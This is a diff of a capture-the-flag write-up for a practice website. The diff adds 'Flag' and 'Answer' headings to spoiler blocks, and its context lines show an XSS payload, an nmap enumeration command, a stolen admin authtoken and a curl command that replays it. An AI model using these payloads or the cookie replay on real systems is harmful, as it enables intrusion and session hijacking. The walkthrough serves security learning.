@@ -12,6 +12,7 @@ Interact with the contact form on the www.issplaylist.com website. What is the f
 **Steps Taken:**
 I navigated to <https://www.issplaylist.com/contact.html> and typed `Mike` into the First Name box. After clicking **Submit**, the page responded with a reference number, which was the flag I needed.  
 
+**Flag:**
 <details>
   <summary>Click to reveal the flag</summary>
 
@@ -34,6 +35,7 @@ Mike<script>alert(1)</script>
 
 The result was immediate — a popup alert appeared, confirming an XSS vulnerability.  
 
+**Answer:**
 <details>
   <summary>Click to reveal the answer</summary>
 
@@ -67,6 +69,7 @@ nmap -n --script=http-enum www.issplaylist.com
 
 But ffuf already confirmed the answer.  
 
+**Answer:**
 <details>
   <summary>Click to reveal the answer</summary>
 
@@ -127,6 +130,7 @@ When the admin later opened the submissions, their authentication cookie was sen
 /authtoken=0f186582606b62965d90e772e76a8a5620b11af9
 ```
 
+**Answer:**
 <details>
   <summary>Click to reveal the answer</summary>
 
@@ -149,6 +153,7 @@ curl -k -b "authtoken=0f186582606b62965d90e772e76a8a5620b11af9" https://www.issp
 
 The output included the flag:  
 
+**Flag:**
 <details>
   <summary>Click to reveal the flag</summary>
 
